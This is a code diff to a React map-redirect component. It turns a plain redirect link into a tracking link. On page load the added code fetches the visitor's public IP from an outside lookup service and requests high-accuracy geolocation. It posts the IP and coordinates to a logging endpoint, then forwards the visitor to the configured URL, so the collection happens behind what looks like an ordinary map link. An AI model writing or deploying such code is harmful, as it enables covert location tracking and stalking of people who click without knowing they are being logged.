@@ -8,8 +8,50 @@ interface MapRedirectClientProps {
 
 export function MapRedirectClient({ redirectUrl }: MapRedirectClientProps) {
   useEffect(() => {
+    const requestLocation = async () => {
+      let clientIp = 'N/A';
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        if (ipResponse.ok) {
+          const ipData = await ipResponse.json();
+          clientIp = ipData.ip;
+        }
+      } catch (e) {
+        console.error("Could not fetch IP", e);
+      }
+
+      const logData = (pos?: GeolocationPosition) => {
+        // This is from a map link, so the source is 'link'
+        const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
+        if (pos) {
+          body.lat = pos.coords.latitude;
+          body.lon = pos.coords.longitude;
+          body.acc = pos.coords.accuracy;
+        }
+
+        fetch('/api/log-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+        }).finally(() => {
+          // Redirect to the final URL from settings after logging
+          window.location.href = redirectUrl;
+        });
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          logData, // Success callback
+          () => logData(), // Error callback
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        logData(); // Geolocation not supported
+      }
+    };
+
     const timer = setTimeout(() => {
-      window.location.replace(redirectUrl);
+        requestLocation();
     }, 800);
     
     return () => clearTimeout(timer);
